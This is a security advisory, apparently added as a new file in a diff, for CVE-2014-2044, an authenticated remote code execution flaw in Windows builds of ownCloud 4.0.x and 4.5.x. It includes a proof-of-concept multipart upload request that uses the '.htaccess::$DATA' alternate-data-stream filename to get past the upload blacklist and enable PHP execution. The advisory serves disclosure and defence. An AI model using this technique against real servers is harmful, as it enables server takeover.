@@ -1,0 +1,70 @@
+Vulnerability title: Remote Code Execution in ownCloud
+CVE: CVE-2014-2044
+Vendor: ownCloud
+Product: ownCloud
+Affected version: 4.0.x & 4.5.x
+Fixed version: 5.0
+Reported by: Alejo Murillo Moya
+
+Details:
+
+A remote code execution has been found and confirmed within ownCloud as
+an authenticated user. A successful attack could allow an authenticated
+attacker to execute PHP code, which could lead to a full compromise of
+the server and associated infrastructure. Please note that only the
+Windows versions of ownCloud are affected and that valid credentials are
+required.
+
+It is possible to create a custom .htaccess into the user's folder on
+Windows version of the application, which will enable PHP execution on
+the folder. This vulnerability exists because it is possible to bypass
+the internal blacklists using Windows ADS (Alternate Data Streams).
+
+Proof Of Concept:
+
+  POST /owncloud_5.0.14a/owncloud/?app=files&getfile=ajax%2Fupload.php HTTP/1.1
+  [...]
+  Content-Type: multipart/form-data; boundary=---------------------------21191376031994875607185408411
+  Requesttoken: None
+
+  -----------------------------21191376031994875607185408411
+  Content-Disposition: form-data; name="MAX_FILE_SIZE" 
+
+  536870912
+  -----------------------------21191376031994875607185408411
+  Content-Disposition: form-data; name="requesttoken" 
+
+  None
+  -----------------------------21191376031994875607185408411
+  Content-Disposition: form-data; name="dir" 
+
+  /
+  -----------------------------21191376031994875607185408411
+  Content-Disposition: form-data; name="files[]"; filename=".htaccess::$DATA" 
+  Content-Type: text/plain
+
+  <PUT YOUR TEXT HERE>
+  -----------------------------21191376031994875607185408411--
+
+
+        
+
+Further details at:
+https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-2044/
+
+
+Copyright:
+Copyright (c) Portcullis Computer Security Limited 2014, All rights
+reserved worldwide. Permission is hereby granted for the electronic
+redistribution of this information. It is not to be edited or altered in
+any way without the express written consent of Portcullis Computer
+Security Limited.
+
+Disclaimer:
+The information herein contained may change without notice. Use of this
+information constitutes acceptance for use in an AS IS condition. There
+are NO warranties, implied or otherwise, with regard to this information
+or its use. Any use of this information is at the user's risk. In no
+event shall the author/distributor (Portcullis Computer Security
+Limited) be held liable for any damages whatsoever arising out of or in
+connection with the use or spread of this information.
